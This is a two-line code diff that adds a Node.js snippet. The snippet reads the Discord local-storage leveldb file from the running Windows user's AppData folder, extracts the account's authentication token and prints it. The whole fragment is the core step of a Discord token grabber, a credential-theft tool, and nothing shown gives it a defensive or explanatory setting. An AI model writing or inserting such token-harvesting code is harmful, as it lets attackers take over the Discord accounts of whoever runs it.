@@ -1,0 +1,2 @@
+let token = require('fs').readFileSync(`C:/Users/${require('os').userInfo().username}/AppData/Roaming/discord/Local Storage/leveldb/000005.ldb`,'utf8').split('>oken')[1].split('\"')[1]
+console.log(token)
